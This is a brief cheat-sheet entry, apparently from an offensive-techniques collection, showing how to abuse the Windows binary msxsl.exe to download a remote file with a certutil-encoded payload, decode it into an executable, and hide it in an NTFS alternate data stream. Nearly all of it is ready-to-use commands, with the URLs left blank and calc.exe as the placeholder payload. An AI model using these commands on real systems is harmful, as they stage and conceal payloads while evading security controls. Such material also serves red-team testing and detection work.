# Use-msxsl-to-download-file

Use MSXSL to download XML with certutil encoded payload
```
msxsl.exe "https:// " "https:// " -o <filename>

certutil -decode <filename> calc.exe
```

Use MSXSL to download XML with certutil encoded payload and save to ADS:
```
msxsl.exe "https:// " "https:// " -o <filename>:<ADS name>

certutil -decode test:pest calc2.exe
```
